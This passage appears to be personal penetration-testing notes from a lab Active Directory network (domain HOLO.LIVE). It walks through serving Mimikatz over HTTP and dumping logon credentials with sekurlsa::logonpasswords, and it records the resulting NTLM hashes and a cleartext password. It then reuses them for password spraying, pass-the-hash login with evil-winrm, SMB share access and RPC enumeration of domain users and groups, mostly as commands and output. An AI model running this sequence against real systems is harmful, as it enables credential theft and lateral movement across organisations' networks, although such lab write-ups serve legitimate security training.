
Let's run Mimikatz
```
http://10.51.9.13/mimikatz/x64/
```

```
python3 -m http.server 80
```

https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz

```
privilege::debug
```

```
sekurlsa::logonpasswords
```

```
Username : S-SRV01$
NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
HA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
```

```
Username : watamet
NTLM     : d8d41e6cf762a8c77776a1843d4141c9
SHA1     : 7701207008976fdd6c6be9991574e2480853312d
DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0

Username : watamet
Domain   : HOLO.LIVE
Password : Nothingtoworry!
```


![[Pasted image 20240830041056.png]]


```
crackmapexec smb 10.201.11.31 -u valid_user.txt -p Nothingtoworry!
```


```
evil-winrm -u administrator -H 3179c8ec65934b8d33ac9ec2a9d93400 -i 10.201.11.35
```


```
evil-winrm -u watamet -password Nothingtoworry! -i 10.201.11.35
```

That didn't worked but we should always try for little hanging fruits
```
rdesktop -u watamet -p Nothingtoworry! 10.201.11.30
```

Read/Write
```
crackmapexec smb 10.201.11.30 -u 'watamet' -p 'Nothingtoworry!' --shares
```
![[Pasted image 20240830043757.png]]

```
smbclient \\\\10.201.11.30\\SYSVOL -U 'watamet' 
```

-p 'Nothingtoworry!'


```
crackmapexec smb 10.201.11.35 -u 'watamet' -p 'Nothingtoworry!' --shares
```
![[Pasted image 20240830044707.png]]

Finally RPC worked
```
rpcclient -U "watamet" 10.201.11.30
```

```
rpcclient $> srvinfo
        10.201.11.30   Wk Sv PDC Tim NT     
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ad-joiner] rid:[0x457]
user:[spooks] rid:[0x45a]
user:[cryillic] rid:[0x45b]
user:[PC-MGR] rid:[0x45c]
user:[SRV-ADMIN] rid:[0x45f]
user:[a-koronei] rid:[0x462]
user:[a-fubukis] rid:[0x466]
user:[koronei] rid:[0x467]
user:[fubukis] rid:[0x468]
user:[matsurin] rid:[0x469]
user:[mikos] rid:[0x46a]
user:[okayun] rid:[0x46b]
user:[watamet] rid:[0x46c]
user:[gurag] rid:[0x46d]
user:[cocok] rid:[0x46e]
user:[ameliaw] rid:[0x46f]
user:[WEB-MGR] rid:[0x470]
```


```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x456]
```

